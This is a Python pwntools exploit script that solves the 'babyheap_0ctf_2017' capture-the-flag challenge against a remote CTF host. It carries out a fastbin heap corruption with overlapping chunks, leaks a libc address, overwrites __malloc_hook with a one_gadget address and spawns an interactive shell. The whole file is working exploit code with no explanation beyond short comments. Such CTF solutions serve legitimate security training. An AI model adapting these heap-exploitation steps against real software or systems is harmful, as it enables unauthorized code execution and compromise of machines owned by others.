# coding:utf-8
from mmap import ALLOCATIONGRANULARITY
from pwn import *
context.log_level = 'debug'

proc_name = 'babyheap_0ctf_2017'
islocal = 0
libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
elf = ELF(proc_name)

if islocal:
    p = process(proc_name)
else:
    p = remote('node4.buuoj.cn', 28294)

def debug(addr, PIE=True):
    if PIE:
        text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
        gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
    else:
        gdb.attach(p,"b *{}".format(hex(addr)))

def allocate(size):
    p.sendlineafter('Command: ', '1')
    p.sendlineafter('Size: ', str(size))

def fill(index, content):
    p.sendlineafter('Command: ', '2')
    p.sendlineafter('Index: ', str(index))
    p.sendlineafter('Size: ', str(len(content)))
    p.sendafter("Content: ", content)

def free(index):
    p.sendlineafter('Command: ', '3')
    p.sendlineafter('Index: ', str(index))

def dump(index):
    p.sendlineafter('Command: ', '4')
    p.sendlineafter('Index: ', str(index))
    p.recvuntil('Content: \n')
    return p.recvline()

def fastbin_attack():
    allocate(0x10)          # chunk 0
    allocate(0x10)          # chunk 1 
    allocate(0x10)          # chunk 2
    allocate(0x10)          # chunk 3
    allocate(0x80)          # chunk 4
    free(1)
    free(2)

    # chunk0
    payload1  = 'a' * 16    # chunk0_data

    # chunk1
    payload1 += p64(0)      # fake chunk1_prev_size
    payload1 += p64(0x21)   # fake chunk1_size
    payload1 += p64(0)      # chunk1_data
    payload1 += 'b' * 8     # chunk1_data

    # chunk2
    payload1 += p64(0)      # fake chunk2_prev_size
    payload1 += p64(0x21)   # fake chunk2_size
    payload1 += p8(0x80)    # fake chunk2_fd ==> [chunk2 -> fd = chunk4]
    
    fill(0, payload1)       # read

    # chunk3
    payload2  = 'c' * 16    # chunk3_data

    payload2 += p64(0)      # prev_size
    payload2 += p64(0x21)   # fake chunk4_size

    fill(3, payload2)       # read

    allocate(0x10)          # chunk1
    allocate(0x10)          # chunk2 => overlap chunk4

def leak_libc():
    global libc_base, malloc_hook

    payload  = 'a' * 16
    payload += p64(0)       # fake chunk4_prev_size
    payload += p64(0x91)    # fake chunk4_size

    fill(3, payload)

    allocate(0x80)          # chunk5
    free(4)
    leak_addr = u64(dump(2)[:8])
    # log.info('leak_addr => ' + hex(leak_addr))
    # pause()
    # debug(0)
    offset = 0x3c4b78
    libc_base = leak_addr - offset
    malloc_hook = libc_base + libc.sym['__malloc_hook']
    log.info('leak_addr => ' + hex(leak_addr))
    log.info('libc_base => ' + hex(libc_base))
    log.info('__malloc_hook => ' + hex(malloc_hook))

def pwn():
    allocate(0x60)          # chunk4
    free(4)
    # fill(2, p64(malloc_hook - 0x20 + 0xd))
    payload = p64(libc_base+0x3c4aed)
    fill(2, payload)

    allocate(0x60)          # chunk4
    allocate(0x60)          # chunk6 -- fake chunk
    one_gadget = libc_base + 0x4526a
    # debug(0)
    fill(6, p8(0) * 3 + p64(0)*2 + p64(one_gadget))    # __malloc_hook => one_gadget

    allocate(1)
    p.interactive()

if __name__ == '__main__':
    fastbin_attack()
    leak_libc()
    pwn()